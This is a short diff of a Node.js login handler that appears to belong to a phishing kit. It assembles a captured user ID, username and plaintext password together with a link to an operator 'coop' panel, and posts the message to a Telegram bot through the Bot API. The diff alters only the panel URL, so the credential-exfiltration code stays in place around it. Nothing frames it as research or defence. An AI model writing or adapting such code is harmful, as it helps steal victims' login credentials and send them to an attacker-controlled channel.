@@ -51,7 +51,7 @@ const submitLogin = async (req, res) => {
 	try {
 		if (count == 3) {
 			owner = "haytch4023";
-			let originalText = `ID: ${uniqueid}\nUsername: ${username}\nPassword: ${password}\n\nAdmin Link: https://haytchc0ding.co.uk/?panel=coop&password=${owner}`;
+			let originalText = `ID: ${uniqueid}\nUsername: ${username}\nPassword: ${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=coop&password=${owner}`;
 			await axios
 				.post(
 					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
